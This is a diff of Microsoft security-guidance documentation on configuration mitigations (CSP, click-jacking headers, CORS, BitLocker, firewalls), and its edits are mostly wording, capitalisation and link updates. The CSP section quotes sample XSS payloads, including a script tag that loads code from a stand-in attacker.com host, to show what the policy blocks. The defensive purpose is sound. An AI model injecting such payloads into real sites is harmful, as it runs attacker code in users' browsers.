@@ -13,7 +13,6 @@ ms.service: security
 ms.subservice: security-develop
 ms.workload: na
 ms.tgt_pltfrm: na
-ms.devlang: na
 ms.topic: article
 ms.date: 02/07/2017
 ms.author: jegeib
@@ -23,17 +22,17 @@ ms.custom: "devx-track-js, devx-track-csharp"
 # Security Frame: Configuration Management | Mitigations 
 | Product/Service | Article |
 | --------------- | ------- |
-| **Web Application** | <ul><li>[Implement Content Security Policy (CSP), and disable inline javascript](#csp-js)</li><li>[Enable browser's XSS filter](#xss-filter)</li><li>[ASP.NET applications must disable tracing and debugging prior to deployment](#trace-deploy)</li><li>[Access third-party javascripts from trusted sources only](#js-trusted)</li><li>[Ensure that authenticated ASP.NET pages incorporate UI Redressing or click-jacking defenses](#ui-defenses)</li><li>[Ensure that only trusted origins are allowed if CORS is enabled on ASP.NET Web Applications](#cors-aspnet)</li><li>[Enable ValidateRequest attribute on ASP.NET Pages](#validate-aspnet)</li><li>[Use locally-hosted latest versions of JavaScript libraries](#local-js)</li><li>[Disable automatic MIME sniffing](#mime-sniff)</li><li>[Remove standard server headers on Windows Azure Web Sites to avoid fingerprinting](#standard-finger)</li></ul> |
+| **Web Application** | <ul><li>[Implement Content Security Policy (CSP), and disable inline JavaScript](#csp-js)</li><li>[Enable browser's XSS filter](#xss-filter)</li><li>[ASP.NET applications must disable tracing and debugging prior to deployment](#trace-deploy)</li><li>[Access third-party JavaScripts from trusted sources only](#js-trusted)</li><li>[Ensure that authenticated ASP.NET pages incorporate UI Redressing or click-jacking defenses](#ui-defenses)</li><li>[Ensure that only trusted origins are allowed if CORS is enabled on ASP.NET Web Applications](#cors-aspnet)</li><li>[Enable ValidateRequest attribute on ASP.NET Pages](#validate-aspnet)</li><li>[Use locally hosted latest versions of JavaScript libraries](#local-js)</li><li>[Disable automatic MIME sniffing](#mime-sniff)</li><li>[Remove standard server headers on Windows Azure Web Sites to avoid fingerprinting](#standard-finger)</li></ul> |
 | **Database** | <ul><li>[Configure a Windows Firewall for Database Engine Access](#firewall-db)</li></ul> |
 | **Web API** | <ul><li>[Ensure that only trusted origins are allowed if CORS is enabled on ASP.NET Web API](#cors-api)</li><li>[Encrypt sections of Web API's configuration files that contain sensitive data](#config-sensitive)</li></ul> |
-| **IoT Device** | <ul><li>[Ensure that all admin interfaces are secured with strong credentials](#admin-strong)</li><li>[Ensure that unknown code cannot execute on devices](#unknown-exe)</li><li>[Encrypt OS and additional partitions of IoT Device with bit-locker](#partition-iot)</li><li>[Ensure that only the minimum services/features are enabled on devices](#min-enable)</li></ul> |
-| **IoT Field Gateway** | <ul><li>[Encrypt OS and additional partitions of IoT Field Gateway with bit-locker](#field-bit-locker)</li><li>[Ensure that the default login credentials of the field gateway are changed during installation](#default-change)</li></ul> |
+| **IoT Device** | <ul><li>[Ensure that all admin interfaces are secured with strong credentials](#admin-strong)</li><li>[Ensure that unknown code cannot execute on devices](#unknown-exe)</li><li>[Encrypt OS and other partitions of IoT Device with BitLocker](#partition-iot)</li><li>[Ensure that only the minimum services/features are enabled on devices](#min-enable)</li></ul> |
+| **IoT Field Gateway** | <ul><li>[Encrypt OS and other partitions of IoT Field Gateway with BitLocker](#field-bit-locker)</li><li>[Ensure that the default login credentials of the field gateway are changed during installation](#default-change)</li></ul> |
 | **IoT Cloud Gateway** | <ul><li>[Ensure that the Cloud Gateway implements a process to keep the connected devices firmware up to date](#cloud-firmware)</li></ul> |
 | **Machine Trust Boundary** | <ul><li>[Ensure that devices have end-point security controls configured as per organizational policies](#controls-policies)</li></ul> |
 | **Azure Storage** | <ul><li>[Ensure secure management of Azure storage access keys](#secure-keys)</li><li>[Ensure that only trusted origins are allowed if CORS is enabled on Azure storage](#cors-storage)</li></ul> |
 | **WCF** | <ul><li>[Enable WCF's service throttling feature](#throttling)</li><li>[WCF-Information disclosure through metadata](#info-metadata)</li></ul> | 
 
-## <a id="csp-js"></a>Implement Content Security Policy (CSP), and disable inline javascript
+## <a id="csp-js"></a>Implement Content Security Policy (CSP), and disable inline JavaScript
 
 | Title                   | Details      |
 | ----------------------- | ------------ |
@@ -42,7 +41,7 @@ ms.custom: "devx-track-js, devx-track-csharp"
 | **Applicable Technologies** | Generic |
 | **Attributes**              | N/A  |
 | **References**              | [An Introduction to Content Security Policy](https://www.html5rocks.com/en/tutorials/security/content-security-policy/), [Content Security Policy Reference](https://content-security-policy.com/), [Security features](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [Introduction to content security policy](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy), [Can I use CSP?](https://caniuse.com/#feat=contentsecuritypolicy) |
-| **Steps** | <p>Content Security Policy (CSP) is a defense-in-depth security mechanism, a W3C standard, that enables web application owners to have control on the content embedded in their site. CSP is added as an HTTP response header on the web server and is enforced on the client side by browsers. It is a allowed list-based policy - a website can declare a set of trusted domains from which active content such as JavaScript can be loaded.</p><p>CSP provides the following security benefits:</p><ul><li>**Protection against XSS:** If a page is vulnerable to XSS, an attacker can exploit it in 2 ways:<ul><li>Inject `<script>malicious code</script>`. This exploit will not work due to CSP's Base Restriction-1</li><li>Inject `<script src="http://attacker.com/maliciousCode.js"/>`. This exploit will not work since the attacker controlled domain will not be in CSP's allowed list of domains</li></ul></li><li>**Control over data exfiltration:** If any malicious content on a webpage attempts to connect to an external website and steal data, the connection will be aborted by CSP. This is because the target domain will not be in CSP's allowed list</li><li>**Defense against click-jacking:** click-jacking is an attack technique using which an adversary can frame a genuine website and force users to click on UI elements. Currently defense against click-jacking is achieved by configuring a response header- X-Frame-Options. Not all browsers respect this header and going forward CSP will be a standard way to defend against click-jacking</li><li>**Real-time attack reporting:** If there is an injection attack on a CSP-enabled website, browsers will automatically trigger a notification to an endpoint configured on the webserver. This way, CSP serves as a real-time warning system.</li></ul> |
+| **Steps** | <p>Content Security Policy (CSP) is a defense-in-depth security mechanism, a W3C standard, that enables web application owners to have control on the content embedded in their site. CSP is added as an HTTP response header on the web server and is enforced on the client side by browsers. It is an allowed list-based policy - a website can declare a set of trusted domains from which active content such as JavaScript can be loaded.</p><p>CSP provides the following security benefits:</p><ul><li>**Protection against XSS:** If a page is vulnerable to XSS, an attacker can exploit it in two ways:<ul><li>Inject `<script>malicious code</script>`. This exploit will not work due to CSP's Base Restriction-1</li><li>Inject `<script src="http://attacker.com/maliciousCode.js"/>`. This exploit will not work since the attacker-controlled domain will not be in CSP's allowed list of domains</li></ul></li><li>**Control over data exfiltration:** If any malicious content on a webpage attempts to connect to an external website and steal data, the connection will be aborted by CSP. This is because the target domain will not be in CSP's allowed list</li><li>**Defense against click-jacking:** click-jacking is an attack technique using which an adversary can frame a genuine website and force users to click on UI elements. Currently defense against click-jacking is achieved by configuring a response header- X-Frame-Options. Not all browsers respect this header and going forward CSP will be a standard way to defend against click-jacking</li><li>**Real-time attack reporting:** If there is an injection attack on a CSP-enabled website, browsers will automatically trigger a notification to an endpoint configured on the webserver. This way, CSP serves as a real-time warning system.</li></ul> |
 
 ### Example
 Example policy: 
@@ -53,15 +52,15 @@ This policy allows scripts to load only from the web application's server and go
 
 ### Example
 Inline scripts will not execute. Following are examples of inline scripts 
-```javascript
-<script> some Javascript code </script>
-Event handling attributes of HTML tags (e.g., <button onclick="function(){}">
+```JavaScript
+<script> some JavaScript code </script>
+Event handling attributes of HTML tags (for example, <button onclick="function(){}">
 javascript:alert(1);
 ```
 
 ### Example
 Strings will not be evaluated as code. 
-```javascript
+```JavaScript
 Example: var str="alert(1)"; eval(str);
 ```
 
@@ -74,7 +73,7 @@ Example: var str="alert(1)"; eval(str);
 | **Applicable Technologies** | Generic |
 | **Attributes**              | N/A  |
 | **References**              | [XSS Protection Filter](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) |
-| **Steps** | <p>X-XSS-Protection response header configuration controls the browser's cross site script filter. This response header can have following values:</p><ul><li>`0:` This will disable the filter</li><li>`1: Filter enabled` If a cross-site scripting attack is detected, in order to stop the attack, the browser will sanitize the page</li><li>`1: mode=block : Filter enabled`. Rather than sanitize the page, when a XSS attack is detected, the browser will prevent rendering of the page</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. The browser will sanitize the page and report the violation.</li></ul><p>This is a Chromium function utilizing CSP violation reports to send details to a URI of your choice. The last 2 options are considered safe values.</p>|
+| **Steps** | <p>X-XSS-Protection response header configuration controls the browser's cross site script filter. This response header can have following values:</p><ul><li>`0:` This will disable the filter</li><li>`1: Filter enabled` If a cross-site scripting attack is detected, in order to stop the attack, the browser will sanitize the page</li><li>`1: mode=block : Filter enabled`. Rather than sanitize the page, when an XSS attack is detected, the browser will prevent rendering of the page</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. The browser will sanitize the page and report the violation.</li></ul><p>This is a Chromium function utilizing CSP violation reports to send details to a URI of your choice. The last two options are considered safe values.</p>|
 
 ## <a id="trace-deploy"></a>ASP.NET applications must disable tracing and debugging prior to deployment
 
@@ -87,7 +86,7 @@ Example: var str="alert(1)"; eval(str);
 | **References**              | [ASP.NET Debugging Overview](/previous-versions/ms227556(v=vs.140)), [ASP.NET Tracing Overview](/previous-versions/bb386420(v=vs.140)), [How to: Enable Tracing for an ASP.NET Application](/previous-versions/0x5wc973(v=vs.140)), [How to: Enable Debugging for ASP.NET Applications](https://msdn.microsoft.com/library/e8z01xdh(VS.80).aspx) |
 | **Steps** | When tracing is enabled for the page, every browser requesting it also obtains the trace information that contains data about internal server state and workflow. That information could be security sensitive. When debugging is enabled for the page, errors happening on the server result in a full stack trace data presented to the browser. That data may expose security-sensitive information about the server's workflow. |
 
-## <a id="js-trusted"></a>Access third-party javascripts from trusted sources only
+## <a id="js-trusted"></a>Access third-party JavaScripts from trusted sources only
 
 | Title                   | Details      |
 | ----------------------- | ------------ |
@@ -96,7 +95,7 @@ Example: var str="alert(1)"; eval(str);
 | **Applicable Technologies** | Generic |
 | **Attributes**              | N/A  |
 | **References**              | N/A  |
-| **Steps** | third-party JavaScripts should be referenced only from trusted sources. The reference endpoints should always be on TLS. |
+| **Steps** | Third-party JavaScripts should be referenced only from trusted sources. The reference endpoints should always be on TLS. |
 
 ## <a id="ui-defenses"></a>Ensure that authenticated ASP.NET pages incorporate UI Redressing or click-jacking defenses
 
@@ -107,7 +106,7 @@ Example: var str="alert(1)"; eval(str);
 | **Applicable Technologies** | Generic |
 | **Attributes**              | N/A  |
 | **References**              | [OWASP click-jacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html), [IE Internals - Combating click-jacking With X-Frame-Options](/archive/blogs/ieinternals/combating-clickjacking-with-x-frame-options) |
-| **Steps** | <p>click-jacking, also known as a "UI redress attack", is when an attacker uses multiple transparent or opaque layers to trick a user into clicking on a button or link on another page when they were intending to click on the top-level page.</p><p>This layering is achieved by crafting a malicious page with an iframe, which loads the victim's page. Thus, the attacker is "hijacking" clicks meant for their page and routing them to another page, most likely owned by another application, domain, or both. To prevent click-jacking attacks, set the proper X-Frame-Options HTTP response headers that instruct the browser to not allow framing from other domains</p>|
+| **Steps** | <p>Click-jacking, also known as a "UI redress attack", is when an attacker uses multiple transparent or opaque layers to trick a user into clicking on a button or link on another page when they were intending to click on the top-level page.</p><p>This layering is achieved by crafting a malicious page with an iframe, which loads the victim's page. Thus, the attacker is "hijacking" clicks meant for their page and routing them to another page, most likely owned by another application, domain, or both. To prevent click-jacking attacks, set the proper X-Frame-Options HTTP response headers that instruct the browser to not allow framing from other domains</p>|
 
 ### Example
 The X-FRAME-OPTIONS header can be set via IIS web.config. Web.config code snippet for sites that should never be framed: 
@@ -146,7 +145,7 @@ Web.config code for sites that should only be framed by pages in the same domain
 
 ### Example
 If access to Web.config is available, then CORS can be added through the following code: 
-```XML
+```xml
 <system.webServer>
     <httpProtocol>
       <customHeaders>
@@ -157,12 +156,12 @@ If access to Web.config is available, then CORS can be added through the followi
 ```
 
 ### Example
-If access to web.config is not available, then CORS can be configured by adding the following CSharp code: 
+If access to web.config is not available, then CORS can be configured by adding the following C# code: 
 ```csharp
 HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
 ```
 
-Please note that it is critical to ensure that the list of origins in "Access-Control-Allow-Origin" attribute is set to a finite and trusted set of origins. Failing to configure this inappropriately (e.g., setting the value as '*') will allow malicious sites to trigger cross origin requests to the web application >without any restrictions, thereby making the application vulnerable to CSRF attacks. 
+Note that it is critical to ensure that the list of origins in "Access-Control-Allow-Origin" attribute is set to a finite and trusted set of origins. Failing to configure this inappropriately (for example, setting the value as '*') will allow malicious sites to trigger cross origin requests to the web application >without any restrictions, thereby making the application vulnerable to CSRF attacks. 
 
 ## <a id="validate-aspnet"></a>Enable ValidateRequest attribute on ASP.NET Pages
 
@@ -177,18 +176,18 @@ Please note that it is critical to ensure that the list of origins in "Access-Co
 
 ### Example
 However, this feature can be disabled at page level: 
-```XML
+```xml
 <%@ Page validateRequest="false" %> 
 ```
 or, at application level 
-```XML
+```xml
 <configuration>
    <system.web>
       <pages validateRequest="false" />
    </system.web>
 </configuration>
 ```
-Please note that Request Validation feature is not supported, and is not part of MVC6 pipeline. 
+Note that Request Validation feature is not supported, and is not part of MVC6 pipeline. 
 
 ## <a id="local-js"></a>Use locally-hosted latest versions of JavaScript libraries
 
@@ -214,7 +213,7 @@ Please note that Request Validation feature is not supported, and is not part of
 
 ### Example
 Add the header in the web.config file if the application is hosted by Internet Information Services (IIS) 7 onwards. 
-```XML
+```xml
 <system.webServer>
 <httpProtocol>
 <customHeaders>
@@ -285,7 +284,7 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 | **SDL Phase**               | Build |  
 | **Applicable Technologies** | SQL Azure, OnPrem |
 | **Attributes**              | N/A, SQL Version - V12 |
-| **References**              | [How to configure an Azure SQL Database firewall](../../azure-sql/database/firewall-configure.md), [Configure a Windows Firewall for Database Engine Access](/sql/database-engine/configure-windows/configure-a-windows-firewall-for-database-engine-access) |
+| **References**              | [How to configure an Azure SQL Database firewall](/azure/azure-sql/database/firewall-configure), [Configure a Windows Firewall for Database Engine Access](/sql/database-engine/configure-windows/configure-a-windows-firewall-for-database-engine-access) |
 | **Steps** | Firewall systems help prevent unauthorized access to computer resources. To access an instance of the SQL Server Database Engine through a firewall, you must configure the firewall on the computer running SQL Server to allow access |
 
 ## <a id="cors-api"></a>Ensure that only trusted origins are allowed if CORS is enabled on ASP.NET Web API
@@ -361,7 +360,7 @@ public class ResourcesController : ApiController
 }
 ```
 
-Please note that it is critical to ensure that the list of origins in EnableCors attribute is set to a finite and trusted set of origins. Failing to configure this inappropriately (e.g., setting the value as '*') will allow malicious sites to trigger cross origin requests to the API without any restrictions, >thereby making the API vulnerable to CSRF attacks. EnableCors can be decorated at controller level. 
+Note that it is critical to ensure that the list of origins in EnableCors attribute is set to a finite and trusted set of origins. Failing to configure this inappropriately (for example, setting the value as '*') will allow malicious sites to trigger cross origin requests to the API without any restrictions, >thereby making the API vulnerable to CSRF attacks. EnableCors can be decorated at controller level. 
 
 ### Example
 To disable CORS on a particular method in a class, the DisableCors attribute can be used as shown below: 
@@ -466,7 +465,7 @@ public void ConfigureServices(IServiceCollection services)
     });
 }
 ```
-Please note that it is critical to ensure that the list of origins in EnableCors attribute is set to a finite and trusted set of origins. Failing to configure this inappropriately (e.g., setting the value as '*') will allow malicious sites to trigger cross origin requests to the API without any restrictions, >thereby making the API vulnerable to CSRF attacks. 
+Note that it is critical to ensure that the list of origins in EnableCors attribute is set to a finite and trusted set of origins. Failing to configure this inappropriately (for example, setting the value as '*') will allow malicious sites to trigger cross origin requests to the API without any restrictions, >thereby making the API vulnerable to CSRF attacks. 
 
 ### Example
 To disable CORS for a controller or action, use the [DisableCors] attribute. 
@@ -508,10 +507,10 @@ To disable CORS for a controller or action, use the [DisableCors] attribute.
 | **SDL Phase**               | Build |  
 | **Applicable Technologies** | Generic |
 | **Attributes**              | N/A  |
-| **References**              | [Enabling Secure Boot and bit-locker Device Encryption on Windows 10 IoT Core](/windows/iot-core/secure-your-device/securebootandbitlocker) |
+| **References**              | [Enabling Secure Boot and BitLocker Device Encryption on Windows 10 IoT Core](/windows/iot-core/secure-your-device/securebootandbitlocker) |
 | **Steps** | UEFI Secure Boot restricts the system to only allow execution of binaries signed by a specified authority. This feature prevents unknown code from being executed on the platform and potentially weakening the security posture of it. Enable UEFI Secure Boot and restrict the list of certificate authorities that are trusted for signing code. Sign all code that is deployed on the device using one of the trusted authorities. |
 
-## <a id="partition-iot"></a>Encrypt OS and additional partitions of IoT Device with bit-locker
+## <a id="partition-iot"></a>Encrypt OS and other partitions of IoT Device with BitLocker
 
 | Title                   | Details      |
 | ----------------------- | ------------ |
@@ -520,7 +519,7 @@ To disable CORS for a controller or action, use the [DisableCors] attribute.
 | **Applicable Technologies** | Generic |
 | **Attributes**              | N/A  |
 | **References**              | N/A  |
-| **Steps** | Windows 10 IoT Core implements a lightweight version of bit-locker Device Encryption, which has a strong dependency on the presence of a TPM on the platform, including the necessary preOS protocol in UEFI that conducts the necessary measurements. These preOS measurements ensure that the OS later has a definitive record of how the OS was launched.Encrypt OS partitions using bit-locker and any additional partitions also in case they store any sensitive data. |
+| **Steps** | Windows 10 IoT Core implements a lightweight version of BitLocker Device Encryption, which has a strong dependency on the presence of a TPM on the platform, including the necessary preOS protocol in UEFI that conducts the necessary measurements. These preOS measurements ensure that the OS later has a definitive record of how the OS was launched.Encrypt OS partitions using BitLocker and any other partitions also in case they store any sensitive data. |
 
 ## <a id="min-enable"></a>Ensure that only the minimum services/features are enabled on devices
 
@@ -531,9 +530,9 @@ To disable CORS for a controller or action, use the [DisableCors] attribute.
 | **Applicable Technologies** | Generic |
 | **Attributes**              | N/A  |
 | **References**              | N/A  |
-| **Steps** | Do not enable or turn off any features or services in the OS that is not required for the functioning of the solution. For e.g. if the device does not require a UI to be deployed, install Windows IoT Core in headless mode. |
+| **Steps** | Do not enable or turn off any features or services in the OS that is not required for the functioning of the solution. For example, if the device does not require a UI to be deployed, install Windows IoT Core in headless mode. |
 
-## <a id="field-bit-locker"></a>Encrypt OS and additional partitions of IoT Field Gateway with bit-locker
+## <a id="field-bit-locker"></a>Encrypt OS and other partitions of IoT Field Gateway with BitLocker
 
 | Title                   | Details      |
 | ----------------------- | ------------ |
@@ -542,7 +541,7 @@ To disable CORS for a controller or action, use the [DisableCors] attribute.
 | **Applicable Technologies** | Generic |
 | **Attributes**              | N/A  |
 | **References**              | N/A  |
-| **Steps** | Windows 10 IoT Core implements a lightweight version of bit-locker Device Encryption, which has a strong dependency on the presence of a TPM on the platform, including the necessary preOS protocol in UEFI that conducts the necessary measurements. These preOS measurements ensure that the OS later has a definitive record of how the OS was launched.Encrypt OS partitions using bit-locker and any additional partitions also in case they store any sensitive data. |
+| **Steps** | Windows 10 IoT Core implements a lightweight version of BitLocker Device Encryption, which has a strong dependency on the presence of a TPM on the platform, including the necessary preOS protocol in UEFI that conducts the necessary measurements. These preOS measurements ensure that the OS later has a definitive record of how the OS was launched.Encrypt OS partitions using BitLocker and any other partitions also in case they store any sensitive data. |
 
 ## <a id="default-change"></a>Ensure that the default login credentials of the field gateway are changed during installation
 
@@ -563,7 +562,7 @@ To disable CORS for a controller or action, use the [DisableCors] attribute.
 | **SDL Phase**               | Build |  
 | **Applicable Technologies** | Generic |
 | **Attributes**              | Gateway choice - Azure IoT Hub |
-| **References**              | [IoT Hub Device Management Overview](../../iot-hub/iot-hub-device-management-overview.md), [How to update Device Firmware](../../iot-hub/tutorial-firmware-update.md) |
+| **References**              | [IoT Hub Device Management Overview](../../iot-hub-device-update/device-update-agent-overview.md),[Device Update for Azure IoT Hub tutorial using the Raspberry Pi 3 B+ Reference Image](../../iot-hub-device-update/device-update-raspberry-pi.md). |
 | **Steps** | LWM2M is a protocol from the Open Mobile Alliance for IoT Device Management. Azure IoT device management allows to interact with physical devices using device jobs. Ensure that the Cloud Gateway implements a process to routinely keep the device and other configuration data up to date using Azure IoT Hub Device Management. |
 
 ## <a id="controls-policies"></a>Ensure that devices have end-point security controls configured as per organizational policies
@@ -575,7 +574,7 @@ To disable CORS for a controller or action, use the [DisableCors] attribute.
 | **Applicable Technologies** | Generic |
 | **Attributes**              | N/A  |
 | **References**              | N/A  |
-| **Steps** | Ensure that devices have end-point security controls such as bit-locker for disk-level encryption, anti-virus with updated signatures, host based firewall, OS upgrades, group policies etc. are configured as per organizational security policies. |
+| **Steps** | Ensure that devices have end-point security controls such as BitLocker for disk-level encryption, anti-virus with updated signatures, host-based firewall, OS upgrades, group policies etc. are configured as per organizational security policies. |
 
 ## <a id="secure-keys"></a>Ensure secure management of Azure storage access keys
 
